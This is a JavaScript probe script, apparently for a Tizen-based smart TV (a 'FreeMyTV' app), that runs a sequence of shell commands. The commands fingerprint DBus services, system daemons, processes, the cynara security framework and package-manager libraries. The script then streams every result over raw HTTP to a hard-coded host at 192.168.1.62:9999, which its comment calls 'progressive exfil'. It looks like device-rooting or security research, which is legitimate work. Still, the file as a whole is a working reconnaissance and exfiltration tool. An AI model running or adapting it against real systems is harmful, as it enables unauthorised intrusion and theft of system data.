"use strict";
/* p32: ASYNC (no event-loop block), capped runs via Node spawn+kill, progressive exfil, heartbeats */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p32', step: 0, results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }

function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try {
    var s=net.connect(PORT,HOST);
    s.setTimeout(30000, function(){ s.destroy(); });
    s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},180000); });
    s.on('error',function(e){L('post err '+e.message);});
    s.on('close',function(){});
  } catch(e){ L('post ctor '+e); }
}
function postProgress(){
  try { postRaw('/p32info', JSON.stringify(R)); } catch(e){}
}

function run(cmd, timeoutMs){
  timeoutMs = timeoutMs || 30000;
  return new Promise(function(resolve){
    var out='', err='';
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], {stdio:['ignore','pipe','pipe']}); }
    catch(e){ resolve('[spawn err ' + e + ']'); return; }
    var done = false;
    var t = setTimeout(function(){
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch(e){}
      try { child.stdout.destroy(); } catch(e){}
      try { child.stderr.destroy(); } catch(e){}
      resolve('[timeout '+timeoutMs+'] ' + out.substring(0,4000) + (err ? ' ERR:'+err.substring(0,1500) : ''));
    }, timeoutMs);
    child.stdout.on('data', function(d){ out += d.toString(); });
    child.stderr.on('data', function(d){ err += d.toString(); });
    child.on('close', function(code){
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 4500));
    });
    child.on('error', function(e){
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function STEP(n, label){
  R.step = n;
  R.results['step_'+n] = label + ' @ ' + new Date().toISOString().substring(11,19);
  postProgress();
  return Promise.resolve();
}

var seq = Promise.resolve();
function add(label, fn){ seq = seq.then(function(){ return STEP(label.n, label.t).then(fn); }).catch(function(e){ R.results['err_'+label.n] = String(e); }); }

// 1. state re-verify
add({n:1,t:'state'}, function(){
  return run('md5sum /opt/dbspace/.app-context.db /opt/dbspace/.app-context.db-journal 2>&1', 8000).then(function(a){
    R.results.state_md5 = a;
    return run('ls -la /opt/dbspace/ 2>&1 | head -15', 8000);
  }).then(function(b){ R.results.state_ls = b; });
});
// 2. sanity + shell info
add({n:2,t:'sanity'}, function(){
  return run('echo sanity-ok; echo SH=$(readlink /bin/sh 2>/dev/null); ls -la /bin/sh 2>&1; which timeout sh 2>&1', 8000).then(function(a){ R.results.sanity = a; });
});
// 3. DBus
add({n:3,t:'dbus'}, function(){
  return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -60', 12000).then(function(a){
    R.results.dbus_names = a;
    return run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr /org/tizen/tv/appfw/appctxmgr org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -25', 12000);
  }).then(function(b){ R.results.dbus_acm_introspect = b; });
});
// 4. acm service def + sizes
add({n:4,t:'acm'}, function(){
  return run('cat /usr/lib/systemd/system/app-context-manager.service 2>&1', 8000).then(function(a){
    R.results.acm_service = a;
    return run('ls -la /usr/bin/app-context-db-checker /usr/bin/tvctx-manager /usr/bin/pkg_initdb /usr/bin/amd 2>&1; echo ---; find /usr -maxdepth 3 -name "*pkg_initdb*" 2>/dev/null | head -5', 15000);
  }).then(function(b){ R.results.acm_sizes = b; });
});
// 5. find '0'
add({n:5,t:'find0'}, function(){
  return run("find /usr/bin /usr/sbin /bin /sbin /opt/usr/bin /usr/local/bin /system -maxdepth 2 -name '0' 2>/dev/null | head; echo ---SDBD---; cat /etc/init.d/sdbd 2>&1 | head -40", 15000).then(function(a){ R.results.find_0_sdbd = a; });
});
// 6. FreeMyTV layout
add({n:6,t:'fmtv'}, function(){
  return run('ls -la /opt/usr/apps/FreeMyTVio/ 2>&1 | head -15', 8000).then(function(a){
    R.results.fmtv_ls = a;
    return run('find /opt/usr/apps/FreeMyTVio -maxdepth 3 -type f 2>/dev/null | head -20', 15000);
  }).then(function(b){ R.results.fmtv_files = b; });
});
// 7. /run + cynara
add({n:7,t:'run_cynara'}, function(){
  return run('ls -la /run/ 2>&1 | head -25', 8000).then(function(a){
    R.results.run_ls = a;
    return run("find /run /var/run -maxdepth 3 -iname '*cynara*' 2>/dev/null | head -10; echo ---; ls -la /opt/usr/data/cynara 2>&1 | head -8", 20000);
  }).then(function(b){ R.results.cynara = b; });
});
// 8. processes
add({n:8,t:'ps'}, function(){
  return run("ps -ef 2>/dev/null | grep -iE 'tvctx|context|dbus|cynara|sdbd|FreeMyTV|launchpad|webapp' | grep -v grep | head -15", 10000).then(function(a){ R.results.ps_ctx = a; });
});
// 9. pkgmgr parserlib
add({n:9,t:'pkgmgr'}, function(){
  return run('ls -la /etc/package-manager/parserlib/ 2>&1 | head -12', 8000).then(function(a){ R.results.pkgmgr_parserlib = a; });
});

seq.then(function(){
  R.results.final = 'done ' + new Date().toISOString();
  postRaw('/p32info', JSON.stringify(R));
  L('p32 done');
}).catch(function(e){
  R.results.fatal = String(e);
  postRaw('/p32info', JSON.stringify(R));
});
